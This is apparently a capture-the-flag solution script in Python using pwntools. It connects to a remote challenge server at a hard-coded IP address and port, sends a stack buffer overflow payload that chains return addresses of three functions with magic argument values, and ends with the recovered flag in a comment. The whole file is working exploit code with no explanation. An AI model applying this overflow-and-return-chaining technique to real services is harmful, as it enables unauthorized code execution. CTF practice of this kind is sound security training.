from pwn import *

r = remote('128.199.234.122', 4300)
r.recv()

fill = b'AAAA'*(6+1)
win_1 = 0x080485cb
win_2 = 0x080485d8
flag = 0x0804862b
param_w2 = 0xBAAAAAAD
param_flag = 0xDEADBAAD

payload = fill +  p32(win_1) + p32(win_2) + p32(flag) + p32(param_w2) + p32(param_flag)

r.send(payload+b"\n")
print(r.recv().decode())

#efiensctf{rop_4gain_and_ag4in_and_aga1n}

